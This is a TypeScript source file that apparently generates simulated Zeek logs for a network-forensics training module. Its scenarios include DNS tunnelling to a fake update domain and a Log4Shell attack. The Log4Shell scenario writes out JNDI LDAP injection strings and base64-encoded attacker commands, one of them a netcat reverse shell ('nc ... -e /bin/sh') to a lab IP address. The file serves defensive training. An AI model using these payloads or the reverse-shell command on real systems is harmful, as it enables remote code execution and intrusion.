const QTYPE: Record<string, number> = { A: 1, AAAA: 28, CNAME: 5, MX: 15, TXT: 16, PTR: 12 }

const tunnelData = memo(() => {
  const r = rng(81)
  const hex = (n: number) => Array.from({ length: n }, () => '0123456789abcdef'[int(r, 0, 15)]).join('')
  const plan: { q: string; type: string; src: string }[] = []
  const tunnel = (type: string, n: number) => {
    for (let i = 0; i < n; i++) plan.push({ q: `${hex(32)}.cisco-update.com`, type, src: TUNNEL_SRC })
  }
  tunnel('AAAA', 320)
  tunnel('CNAME', 900)
  tunnel('TXT', 600)
  tunnel('MX', 400)
  const normal: [string, string, number][] = [
    ['www.rhodes.edu', 'A', 6], ['ubuntu.com', 'A', 5], ['connectivity-check.ubuntu.com', 'A', 4],
    ['_ipp._tcp.local', 'PTR', 4], ['21.2.10.10.in-addr.arpa', 'PTR', 5], ['3.57.20.10.in-addr.arpa', 'PTR', 3],
    ['1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f.ip6.arpa', 'PTR', 3],
  ]
  for (const [q, type, n] of normal) for (let i = 0; i < n; i++) plan.push({ q, type, src: '10.20.57.11' })
  shuffle(r, plan)

  const dns: Cell[][] = []
  const conns: Conn[] = []
  let t = 1623212924.8
  plan.forEach((p, i) => {
    const row = dnsRow(r, t, p.src, TUNNEL_DNS, p.q, p.type === 'A' ? '10.10.2.80' : '-')
    row[12] = QTYPE[p.type]
    row[13] = p.type
    dns.push(row)
    conns.push({
      ts: t, uid: String(row[1]), oh: p.src, op: Number(row[3]), rh: TUNNEL_DNS, rp: 53, proto: 'udp', service: 'dns',
      dur: i === 1207 ? '9.420791' : (r() * 0.9).toFixed(6), ob: int(r, 60, 120), rb: int(r, 80, 300), state: 'SF', hist: 'Dd', opk: 1, rpk: 1,
    })
    t += 0.02 + r() * 0.12
  })
  return { conns, dns: zlog('dns', DNS_FIELDS, DNS_TYPES, dns, '2021-06-09-04-28-44') }
})

const dnsTunnel: Scenario = {
  conns: () => tunnelData().conns,
  run: () => {
    const d = tunnelData()
    return {
      files: {
        'conn.log': connLog(d.conns, '2021-06-09-04-28-44'),
        'dns.log': d.dns,
        'ntp.log': zlog(
          'ntp',
          'ts uid id.orig_h id.orig_p id.resp_h id.resp_p version mode stratum poll precision root_delay root_disp ref_id num_exts',
          'time string addr port addr port count count count interval interval interval interval string count',
          [[ts(1623212931.4), 'CnTpq81VbYz0kLmR2a', '10.20.57.11', 123, '10.10.2.21', 123, 4, 3, 3, '64.000000', '0.000000', '0.031250', '0.046875', '10.10.2.1', 0]],
          '2021-06-09-04-28-44',
        ),
        'packet_filter.log': packetFilterLog(1623212924.8, '2021-06-09-04-28-44'),
      },
      stdout: [],
    }
  },
}

// ======================================================================
// log4shell.pcapng — modul Latihan Zeek, kasus Log4J
// ======================================================================

const L4_ATT = '192.168.56.102'
const L4_VIC = '172.17.0.2'
const L4_CMDS = ['touch /tmp/pwned\n', 'which nc > /tmp/pwned\n', 'nc 192.168.56.102 80 -e /bin/sh\n']
const L4_CLASSES = ['/ExploitQ8v7ygBW4i.class', '/Exploit6HHc3BcVzI.class', '/ExploitSMMZvT8GXL.class']
const NMAP_UA = 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)'

const log4jData = memo(() => {
  const r = rng(91)
  const http: Http[] = []
  let t = 1640023652.1
  const probes: [string, string, number, string][] = [
    ['GET', '/', 200, 'OK'], ['OPTIONS', '/', 200, 'OK'], ['GET', '/robots.txt', 404, 'Not Found'], ['GET', '/.git/HEAD', 404, 'Not Found'],
    ['POST', '/sdk', 404, 'Not Found'], ['GET', '/nmaplowercheck1640023652', 404, 'Not Found'], ['GET', '/HNAP1', 404, 'Not Found'],
    ['PROPFIND', '/', 405, 'Method Not Allowed'], ['GET', '/evox/about', 404, 'Not Found'], ['GET', '/favicon.ico', 404, 'Not Found'],
  ]
  for (let i = 0; i < 22; i++) {
    const [method, uri, status, msg] = probes[i % probes.length]
    http.push({ ts: t, uid: uid(r), oh: L4_ATT, op: int(r, 33000, 60000), rh: L4_VIC, rp: 8080, method, host: `${L4_VIC}:8080`, uri, ua: NMAP_UA, respLen: status === 200 ? 13 : 0, status, msg })
    t += 0.03 + r() * 0.2
  }
  const b64 = L4_CMDS.map((c) => globalThis.btoa(c))
  const exploits: Http[] = []
  b64.forEach((b, i) => {
    t += 20 + r() * 30
    const ex: Http = {
      ts: t, uid: uid(r), oh: L4_ATT, op: int(r, 33000, 60000), rh: L4_VIC, rp: 8080, method: 'GET', host: `${L4_VIC}:8080`, uri: '/',
      ua: `\${jndi:ldap://${L4_ATT}:389/Basic/Command/Base64/${b}}`, respLen: 13, status: 200, msg: 'OK',
    }
    exploits.push(ex)
    http.push(ex)
    http.push({ ts: t + 0.4, uid: uid(r), oh: L4_VIC, op: int(r, 33000, 60000), rh: L4_ATT, rp: 443, method: 'GET', host: `${L4_ATT}:443`, uri: L4_CLASSES[i], ua: 'Java/1.8.0_181', respLen: 1215, status: 200, msg: 'OK', respMime: 'application/x-java-applet' })
  })
  const conns: Conn[] = http.map((h) => ({
    ts: h.ts - 0.01, uid: h.uid, oh: h.oh, op: h.op, rh: h.rh, rp: h.rp ?? 80, proto: 'tcp', service: 'http',
    dur: (0.01 + r() * 0.5).toFixed(6), ob: int(r, 150, 500), rb: int(r, 150, 1500), state: 'SF', hist: 'ShADadFf', opk: int(r, 5, 9), rpk: int(r, 4, 8),
  }))
  return { http, conns, exploits, b64 }
})

const log4j: Scenario = {
  conns: () => log4jData().conns,
  run: (fx) => {
    const d = log4jData()
    const open = '2021-12-20-18-07-32'
    const files: Record<string, string> = {
      'conn.log': connLog(d.conns, open),
      'http.log': httpLog(d.http),
      'packet_filter.log': packetFilterLog(d.conns[0].ts, open),
    }
    const notices: Notice[] = []
    if (fx.has('log4j')) {
      const hits: SigHit[] = d.exploits.map((e, i) => ({
        ts: e.ts + 0.41, uid: d.http[d.http.indexOf(e) + 1].uid, src: L4_ATT, sport: 443, dst: L4_VIC, dport: d.http[d.http.indexOf(e) + 1].op,
        sig: 'log4j_javaclassname_tcp', msg: `${L4_ATT}: log4j_javaclassname_tcp`, sub: `\\xca\\xfe\\xba\\xbe\\x00\\x00\\x004\\x00... ${L4_CLASSES[i].slice(1, -6)}`,
      }))
      files['signatures.log'] = signaturesLog(hits, open)
      notices.push(...hits.map(sigNotice))
      files['log4j.log'] = zlog(
        'log4j',
        'ts uid http_uri uri stem target_host target_port method is_orig name value matched_headers',
        'time string string string string string string string bool string string vector[string]',
        d.exploits.map((e, i) => [
          ts(e.ts), e.uid, '/', `${L4_ATT}:389/Basic/Command/Base64/${d.b64[i]}`, `${L4_ATT}:389`, L4_ATT, '389', 'GET', 'T',
          'X-API-VERSION', `\${jndi:ldap://${L4_ATT}:389/Basic/Command/Base64/${d.b64[i]}}`, 'ACCEPT,USER-AGENT,X-API-VERSION',
        ]),
        open,
      )
    }
    return { files, stdout: [], notices }
  },
}

export const SCENARIOS: Record<string, Scenario> = {
  'dns-tunneling.pcap': dnsTunnel,
  'phishing.pcap': case1,
  'log4shell.pcapng': log4j,
  'sample.pcap': sample,
  'http.pcap': httpScenario,
  'ftp.pcap': ftpScenario,
  'ftp-brute.pcap': ftpBrute,
  'smallFlows.pcap': smallFlows,
  'bigFlows.pcap': bigFlows,
  'case1.pcap': case1,
  'case2.pcap': case2,
}

// ---------- log tambahan saat memuat semua script lokal ----------

const PROTOS = ['conn', 'dce-rpc', 'dhcp', 'dnp3', 'dns', 'ftp', 'http', 'imap', 'irc', 'krb', 'modbus', 'mqtt', 'mysql', 'ntlm', 'ntp', 'pop3', 'radius', 'rdp', 'rfb', 'sip', 'smb', 'smtp', 'snmp', 'socks', 'ssh', 'ssl', 'syslog', 'tunnels', 'xmpp']
const FRAMEWORKS = ['analyzer', 'broker', 'cluster', 'config', 'control', 'dpd', 'files', 'input', 'intel', 'logging', 'netcontrol', 'notice', 'openflow', 'packet-filter', 'reporter', 'signatures', 'software', 'sumstats', 'tunnels']

export const loadedScriptsLog = memo(() => {
  const base = '/opt/zeek/share/zeek'
  const names: string[] = [`${base}/base/init-bare.zeek`, `${base}/base/init-frameworks-and-bifs.zeek`, `${base}/base/init-default.zeek`]
  for (const f of FRAMEWORKS) for (const s of ['__load__', 'main', 'utils']) names.push(`${base}/base/frameworks/${f}/${s}.zeek`)
  for (const p of PROTOS) for (const s of ['__load__', 'main', 'consts', 'dpd.sig']) names.push(`${base}/base/protocols/${p}/${s}${s.endsWith('.sig') ? '' : '.zeek'}`)
  for (const p of PROTOS) for (const s of ['events', 'types', 'functions']) names.push(`${base}/base/bif/plugins/Zeek_${p.toUpperCase().replace('-', '_')}.${s}.bif.zeek`)
  for (const u of ['addrs', 'conn-ids', 'dir', 'directions-and-hosts', 'email', 'files', 'geoip-distance', 'numbers', 'paths', 'patterns', 'queue', 'site', 'strings', 'thresholds', 'time', 'urls']) names.push(`${base}/base/utils/${u}.zeek`)
  for (const p of PROTOS) for (const s of ['detect', 'software', 'known']) names.push(`${base}/policy/protocols/${p}/${s}.zeek`)
  for (const s of ['local', 'zeekctl/__load__', 'zeekctl/main', 'zeekctl/auto']) names.push(`${base}/site/${s}.zeek`)
  let i = 0
  while (names.length < 498) names.push(`${base}/policy/misc/extra-${++i}.zeek`)
  return zlog('loaded_scripts', 'name', 'string', names.slice(0, 498).map((n) => [n]))
})

export const captureLossLog = (t: number) =>
  zlog('capture_loss', 'ts ts_delta peer gaps acks percent_lost', 'time interval string count count double', [[ts(t), '900.000000', 'zeek', 0, 0, '0.000000']])

export const statsLog = (t: number, conns: number) =>
  zlog('stats', 'ts peer mem pkts_proc bytes_recv events_proc events_queued active_tcp_conns active_udp_conns', 'time string count count count count count count count', [[ts(t), 'zeek', 62, conns * 9, conns * 4100, conns * 14, conns * 14, 0, 0]])

export { noticeLog }
